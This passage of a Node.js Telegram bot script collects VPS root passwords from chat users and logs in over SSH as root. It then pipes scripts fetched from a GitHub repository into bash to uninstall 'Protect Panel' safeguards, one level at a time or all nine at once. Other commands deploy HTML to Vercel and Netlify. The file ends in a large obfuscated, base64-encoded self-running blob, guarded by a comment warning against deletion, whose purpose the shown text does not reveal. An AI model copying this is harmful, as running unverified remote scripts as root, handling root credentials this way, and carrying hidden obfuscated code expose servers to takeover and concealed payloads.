      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect3 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect3 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzreal/uninstallprotectpanel/main/uninstallprotect3.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai Uninstall Protect 3 Panel...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses Uninstall sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *uninstall protect 3 selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /uninstallprotect4 (versi SSH2) ────────────────────
  bot.onText(/^\/uninstallprotect4 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect4 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect4 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzreal/uninstallprotectpanel/main/uninstallprotect4.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai Uninstall Protect 4 Panel...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses Uninstall sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *uninstall protect 4 selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /uninstallprotect5 (versi SSH2) ────────────────────
  bot.onText(/^\/uninstallprotect5 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect5 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect5 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzreal/uninstallprotectpanel/main/uninstallprotect5.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai Uninstall Protect 5 Panel...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses Uninstall sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *uninstall protect 5 selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /uninstallprotect6 (versi SSH2) ────────────────────
  bot.onText(/^\/uninstallprotect6 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect6 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect6 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzreal/uninstallprotectpanel/main/uninstallprotect6.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai Uninstall Protect 6 Panel...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses Uninstall sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *uninstall protect 6 selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /uninstallprotect7 (versi SSH2) ────────────────────
  bot.onText(/^\/uninstallprotect7 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect7 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect7 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzreal/uninstallprotectpanel/main/uninstallprotect7.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai Uninstall Protect 7 Panel...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses Uninstall sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *uninstall protect 7 selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /uninstallprotect8 (versi SSH2) ────────────────────
  bot.onText(/^\/uninstallprotect8 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect8 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect8 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzreal/uninstallprotectpanel/main/uninstallprotect8.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai Uninstall Protect 8 Panel...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses Uninstall sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *uninstall protect 8 selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
  // ─── /uninstallprotect9 (versi SSH2) ────────────────────
  bot.onText(/^\/uninstallprotect9 (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const input = match[1];

    // Validasi premium


    // Validasi format input
    if (!input.includes('|')) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect9 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect9 ipvps|pwvps`', { parse_mode: 'Markdown' });
    }

    const conn = new Client();
    const scriptURL = 'https://raw.githubusercontent.com/yamzzreal/uninstallprotectpanel/main/uninstallprotect9.sh';

    bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai Uninstall Protect 9 Panel...`, { parse_mode: 'Markdown' });

    conn.on('ready', () => {
      bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses Uninstall sedang berjalan...');

      // Jalankan skrip install via SSH
      conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
        if (err) {
          conn.end();
          return bot.sendMessage(chatId, `❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, { parse_mode: 'Markdown' });
        }

        let output = '';

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += `\n[ERROR] ${data.toString()}`;
        });

        stream.on('close', () => {
          conn.end();

          const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
          bot.sendMessage(chatId, `✅ *uninstall protect 9 selesai!*\n\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, {
            parse_mode: 'Markdown'
          });
        });
      });
    });

    conn.on('error', (err) => {
      bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, {
        parse_mode: 'Markdown'
      });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });
  });
// ─── /uninstallprotectall (versi SSH2) ────────────────────
bot.onText(/^\/uninstallprotectall (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const input = match[1];

  // Validasi premium
  if (!setting.ADMIN_IDS.includes(userId)) {
      return bot.sendMessage(chatId, '❌ Hanya user premium yang bisa menggunakan perintah ini!');
    }

  // Validasi format input
  if (!input.includes('|')) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotectall ipvps|pwvps`', { parse_mode: 'Markdown' });
  }

  const [ipvps, pwvps] = input.split('|').map(i => i.trim());
  if (!ipvps || !pwvps) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotectall ipvps|pwvps`', { parse_mode: 'Markdown' });
  }

  const conn = new Client();
  const scripts = [
    'uninstallprotect1.sh',
    'uninstallprotect2.sh',
    'uninstallprotect3.sh',
    'uninstallprotect4.sh',
    'uninstallprotect5.sh',
    'uninstallprotect6.sh',
    'uninstallprotect7.sh',
    'uninstallprotect8.sh',
    'uninstallprotect9.sh'
  ];

  bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* dan mulai Uninstall Protect Panel 1-9...`, { parse_mode: 'Markdown' });

  conn.on('ready', async () => {
    bot.sendMessage(chatId, '⚙️ Koneksi berhasil! Proses uninstall semua Protect Panel sedang berjalan...');

    for (let i = 0; i < scripts.length; i++) {
      const scriptURL = `https://raw.githubusercontent.com/yamzzreal/uninstallprotectpanel/main/${scripts[i]}`;
      bot.sendMessage(chatId, `🚀 Memulai uninstall *${scripts[i]}*...`, { parse_mode: 'Markdown' });

      await new Promise((resolve) => {
        conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
          if (err) {
            bot.sendMessage(chatId, `❌ Gagal mengeksekusi ${scripts[i]}:\n\`${err.message}\``, { parse_mode: 'Markdown' });
            return resolve();
          }

          let output = '';

          stream.on('data', (data) => {
            output += data.toString();
          });

          stream.stderr.on('data', (data) => {
            output += `\n[ERROR] ${data.toString()}`;
          });

          stream.on('close', () => {
            const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
            bot.sendMessage(chatId, `✅ *${scripts[i]} selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, { parse_mode: 'Markdown' });
            resolve();
          });
        });
      });
    }

    conn.end();
    bot.sendMessage(chatId, '🎉 Semua uninstall Protect Panel 1-9 selesai!', { parse_mode: 'Markdown' });
  });

  conn.on('error', (err) => {
    bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, { parse_mode: 'Markdown' });
  });

  conn.connect({
    host: ipvps,
    port: 22,
    username: 'root',
    password: pwvps
  });
 });

bot.onText(/\/deployvercel (.+)/, async (msg, match) => {
const chatId = msg.chat.id;

const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }
  if (!msg.reply_to_message?.document) return bot.sendMessage(msg.chat.id, "Reply file HTML dengan command ini!");
  const domain = match[1];

  const fileId = msg.reply_to_message.document.file_id;
  const file = await bot.getFileLink(fileId);
  const res = await axios.get(file, { responseType: "arraybuffer" });
  const filePath = `./${msg.from.id}.html`;
  fs.writeFileSync(filePath, res.data);

  // Upload repo ke GitHub
  const repoName = `deploy-${Date.now()}`;
  await axios.post(`https://api.github.com/user/repos`, {
    name: repoName,
    private: false
  }, { headers: { Authorization: `token ${githubToken}` } });

  const content = Buffer.from(fs.readFileSync(filePath)).toString("base64");
  await axios.put(`https://api.github.com/repos/${githubUser}/${repoName}/contents/index.html`, {
    message: "initial commit",
    content
  }, { headers: { Authorization: `token ${githubToken}` } });

  // Deploy ke Vercel
  const vercelDeploy = await axios.post(`https://api.vercel.com/v13/deployments`, {
    name: repoName,
    gitSource: { type: "github", repoId: `${githubUser}/${repoName}`, ref: "main" }
  }, { headers: { Authorization: `Bearer ${vercelToken}` } });

  bot.sendMessage(msg.chat.id, `✅ Website berhasil di deploy!\n🌍 Domain: https://${domain}.vercel.app\n🛠 Repo: https://github.com/${githubUser}/${repoName}`);
  fs.unlinkSync(filePath);
});

// ============= Deploy to GitHub + Netlify =============
bot.onText(/\/deploynetlify (.+)/, async (msg, match) => {
const chatId = msg.chat.id;

const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }
  if (!msg.reply_to_message?.document) return bot.sendMessage(msg.chat.id, "Reply file HTML dengan command ini!");
  const domain = match[1];

  const fileId = msg.reply_to_message.document.file_id;
  const file = await bot.getFileLink(fileId);
  const res = await axios.get(file, { responseType: "arraybuffer" });
  const filePath = `./${msg.from.id}.html`;
  fs.writeFileSync(filePath, res.data);

  // Upload ke Netlify
  const form = new FormData();
  form.append("file", fs.createReadStream(filePath));

  const netlifyDeploy = await axios.post("https://api.netlify.com/api/v1/sites", form, {
    headers: { 
      Authorization: `Bearer ${netlifyToken}`,
      ...form.getHeaders()
    }
  });

  bot.sendMessage(msg.chat.id, `✅ Website berhasil di deploy!\n🌍 Domain: https://${domain}.netlify.app`);
  fs.unlinkSync(filePath);
});

// === Error Handling ===
bot.on('polling_error', e => console.log('⚠️', e.message));

// === Global Unhandled Rejection ===
process.on('unhandledRejection', async (reason) => {
  console.error('🚨 Unhandled Rejection:', reason);
  for (const adminId of setting.ADMIN_IDS) {
    await bot.sendMessage(
      adminId,
      `⚠️ *Unhandled Rejection!*\n\`\`\`${reason.stack || reason}\`\`\``,
      { parse_mode: 'Markdown' }
    ).catch(() => {});
  }
});

/// DI DELL / ERROR ///
(function(){var b="Y29uc3QgX19fX19fM2gxPVsyLDEsMCxudWxsLDEwLGZhbHNlLHRydWUsOCwxNiwiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmIiwiXHg2Zlx4MzZceDdhIiw1MTIsMjU2LCJcdTAwMzBcdTAwMzFcdTAwMzJcdTAwMzNcdTAwMzRcdTAwMzUiLDE1LDMsNCw2LDEwMjMsNjMsMTI4LDEyLDI1NSwzMiw1LDI0LDcsMTgsMTksNjQsNjU1MzUsIlx1MDA2MVx1MDA2Mlx1MDA2MyIsIlx4NjQiLDkwOTUyMjQ4NiwxNTQ5NTU2ODI4LCJcdTAwMzZcdTAwMzdcdTAwMzhcdTAwMzlcdTAwNDFcdTAwNDIiLCJcdTAwNDNcdTAwNDRcdTAwNDVcdTAwNDYiLCJceDM2XHgzN1x4MzhceDM5XHg2MVx4NjIiLCJceDYzXHg2NFx4NjVceDY2Iiw1NTI5Niw1NjMxOSw1NjMyMCw1NzM0Myw2NTUzNiwxMjcsMjA0NywxOTIsMzEsMjI0LDIwOTcxNTEsMjQwLDEzLDIyLDExLDI1LDE3LDI4LDM0LDM5LDE0LDQxLDYxLDExMTYzNTI0MDgsMTg5OTQ0NzQ0MSwxMjQ1NjQzODI1LDM3Mzk1NzcyMyw5NjE5ODcxNjMsMTUwODk3MDk5MywxODQxMzMxNTQ4LDE0MjQyMDQwNzUsNjcwNTg2MjE2LDMxMDU5ODQwMSw2MDcyMjUyNzgsMTQyNjg4MTk4NywxOTI1MDc4Mzg4LDIxMzI4ODkwOTAsMTY4MDA3OTE5MywxMDQ2NzQ0NzE2LDQ1OTU3Njg5NSwyNzI3NDI1MjIsMjY0MzQ3MDc4LDYwNDgwNzYyOCw3NzAyNTU5ODMsMTI0OTE1MDEyMiwxNTU1MDgxNjkyLDE5OTYwNjQ5ODYsMTc0MDc0NjQxNCwxNDczMTMyOTQ3LDEzNDE5NzA0ODgsMTA4NDY1MzYyNSw5NTgzOTU0MDUsNzEwNDM4NTg1LDExMzkyNjk5MywzMzgyNDE4OTUsNjY2MzA3MjA1LDc3MzUyOTkxMiwxMjk0NzU3MzcyLDEzOTYxODIyOTEsMTY5NTE4MzcwMCwxOTg2NjYxMDUxLDIxMTc5NDA5NDYsMTgzODAxMTI1OSwxNTY0NDgxMzc1LDE0NzQ2NjQ4ODUsMTAzNTIzNjQ5Niw5NDkyMDI1MjUsNzc4OTAxNDc5LDY5NDYxNDQ5MiwyMDAzOTUzODcsMjc1NDIzMzQ0LDQzMDIyNzczNCw1MDY5NDg2MTYsNjU5MDYwNTU2LDg4Mzk5Nzg3Nyw5NTgxMzk1NzEsMTMyMjgyMjIxOCwxNTM3MDAyMDYzLDE3NDc4NzM3NzksMTk1NTU2MjIyMiwyMDI0MTA0ODE1LDIwNjcyMzY4NDQsMTkzMzExNDg3MiwxODY2NTMwODIyLDE1MzgyMzMxMDksMTA5MDkzNTgxNyw5NjU2NDE5OTgsMTc3OTAzMzcwMywxMTUwODMzMDE5LDEwMTM5MDQyNDIsMTUyMTQ4NjUzNCwxMzU5ODkzMTE5LDE2OTQxNDQzNzIsNTI4NzM0NjM1LDE1NDE0NTkyMjUsOSw0MjkwNzcyOTkyLDY1NTM3LDEwMCwzMCwyMjQ2ODIyNTA3LDMyNjY0ODk5MDksNjAsIlx1MDAyZiIsdW5kZWZpbmVkLCJcdTAwNDFcdTAwNDJcdTAwNDNcdTAwNDRcdTAwNDVcdTAwNDZcdTAwNDdcdTAwNDhcdTAwNDkiLCJceDRhXHg0Ylx4NGNceDRkXHg0ZVx4NGZceDUwXHg1MVx4NTIiLCJcdTAwNTNcdTAwNTRcdTAwNTVcdTAwNTZcdTAwNTdcdTAwNThcdTAwNTlcdTAwNWFcdTAwNjEiLCJceDYyXHg2M1x4NjRceDY1XHg2Nlx4NjdceDY4XHg2OVx4NmEiLCJceDZiXHg2Y1x4NmRceDZlXHg2Zlx4NzBceDcxXHg3Mlx4NzMiLCJceDc0XHg3NVx4NzZceDc3XHg3OFx4NzlceDdhXHgzMFx4MzEiLCJceDMyXHgzM1x4MzRceDM1XHgzNlx4MzdceDM4XHgzOVx4MmIiLDMzNTU0NDMyLDY3MTA4ODY0LCJceDYyXHg2MVx4MzdceDM4XHgzMVx4MzZceDYyXHg2Nlx4MzgiLCJcdTAwNjZcdTAwMzBcdTAwMzFcdTAwNjNcdTAwNjZcdTAwNjVcdTAwNjFcdTAwMzRcdTAwMzEiLCJceDM0XHgzMVx4MzRceDMwXHg2NFx4NjVceDM1XHg2NFx4NjEiLCJcdTAwNjVcdTAwMzJcdTAwMzJcdTAwMzJcdTAwMzNcdTAwNjJcdTAwMzBcdTAwMzBcdTAwMzMiLCJcdTAwMzZcdTAwMzFcdTAwNjFcdTAwMzNcdTAwMzlcdTAwMzZcdTAwMzFcdTAwMzdcdTAwMzciLCJceDYxXHgzOVx4NjNceDYyXHgzNFx4MzFceDMwXHg2Nlx4NjYiLCJceDM2XHgzMVx4NjZceDMyXHgzMFx4MzBceDMxXHgzNVx4NjEiLCJceDBhIiwiXHg3NFx4NjVceDczXHg3NCIsIlx1MDA3M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2NyIsIlx1MDAyOSIsIlx1MDA3NFx1MDA2Zlx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OSIsIlx4NmVceDY3IiwiXHg2Y1x4NmZceDY3IiwiXHg2ZFx4NjFceDY5XHg2ZSIsIlx4NjVceDc4XHg2OVx4NzQiXTtmdW5jdGlvbiBfX19fX19reTYoX19fX19fa3k2LF9fX19fX2x4ZSxfX19fX190aTUpe3N3aXRjaChfX19fX19reTYpe2Nhc2UgX19fX19fM2gxWzldK19fX19fXzNoMVsxMF06cmV0dXJuIF9fX19fX2x4ZStfX19fX190aTV9fWZ1bmN0aW9uIF9fX19fX2x4ZSgpe30oZnVuY3Rpb24oKXtpZigiXHUwMDUyXHUwMDQ5XHUwMDc3XHUwMDQ1XHUwMDQ1XHUwMDUwIiBpbiBfX19fX19seGUpe19fX19fX3RpNSgpfWZ1bmN0aW9uIF9fX19fX3RpNSgpe2Z1bmN0aW9uKl9fX19fX3RpNShfX19fX190aTUsX19fX19fa3k2LF9fX19fX2x4ZSxfX19fX3hwdT17WyJceDVmXHg1Zlx4NWZceDVmXHg2NFx4MzZceDc2Il06e319KXt3aGlsZShfX19fX190aTUrX19fX19fa3k2K19fX19fX2x4ZSE9PS0yMDYpe3dpdGgoX19fX194cHVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzMVx1MDA3MFx1MDA3NCJdfHxfX19fX3hwdSl7c3dpdGNoKF9fX19fX3RpNStfX19fX19reTYrX19fX19fbHhlKXtjYXNlIF9fX19fX2t5Ni0gLTU0OltfX19fX3hwdVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY0XHUwMDM2XHUwMDc2Il1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2ZFx4N2FceDc5Il1dPVstNjJdO19fX19kNnZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzOVx1MDAzNlx1MDA3MyJdPXJlcXVpcmUoImJpZy1pbnRlZ2VyIik7X19fX2Q2dlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDMyXHUwMDc4XHUwMDc1Il09Y2xhc3MgX19fX19oNnh7c3RhdGljIHJhbmRvbVByaW1lKF9fX19fX3RpNSl7Y29uc3QgX19fX19fa3k2PV9fX19kNnZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzlceDM2XHg3MyJdLm9uZS5zaGlmdExlZnQoX19fX19fdGk1LV9fX19fXzNoMVsxXSk7Y29uc3QgX19fX19fbHhlPV9fX19kNnZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzOVx1MDAzNlx1MDA3MyJdLm9uZS5zaGlmdExlZnQoX19fX19fdGk1KS5wcmV2KCk7d2hpbGUoX19fX19fM2gxWzZdKXtsZXQgX19fX194cHU9X19fX2Q2dlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM5XHUwM